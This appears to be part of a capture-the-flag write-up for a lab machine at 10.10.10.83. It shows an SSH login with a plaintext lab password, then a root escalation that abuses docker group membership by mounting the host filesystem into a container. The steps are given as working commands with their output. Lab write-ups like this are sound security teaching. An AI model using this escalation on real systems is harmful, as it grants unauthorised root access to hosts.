# Escalation (port 22)

```bash
$ ssh prometheus@10.10.10.83
The authenticity of host '10.10.10.83 (10.10.10.83)' can't be established.
ECDSA key fingerprint is SHA256:8TR2+AWSBT/c5mrjpDotoEYu0mEy/jCzpuS79d+Z0oY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.83' (ECDSA) to the list of known hosts.
prometheus@10.10.10.83's password: St34l_th3_F1re!

Welcome to
                            
    )         (             
 ( /(     )   )\ )   (      
 )\()) ( /(  (()/(  ))\ (   
((_)\  )(_))  ((_))/((_))\  
| |(_)((_)_   _| |(_)) ((_) 
| ' \ / _` |/ _` |/ -_)(_-< 
|_||_|\__,_|\__,_|\___|/__/ 
                           
prometheus@olympus:~$
```

Prometheus is in the `docker` group.

```bash
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
crete               latest              31be8149528e        3 years ago         450MB
olympia             latest              2b8904180780        3 years ago         209MB
rodhes              latest              82fbfd61b8c1        3 years ago         215MB
```

```bash
$ docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
f00ba96171c5        crete               "docker-php-entrypoi…"   3 years ago         Up About an hour    0.0.0.0:80->80/tcp                       crete
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   3 years ago         Up About an hour    0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      3 years ago         Up About an hour    0.0.0.0:2222->22/tcp                     olympia
```

We can run `olympia` docker process as root with the following command.

```bash
$ docker run -v /:/root -i -t olympia /bin/bash
root@07abfc9f9938:/# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag are in `/root/root/root.txt`.
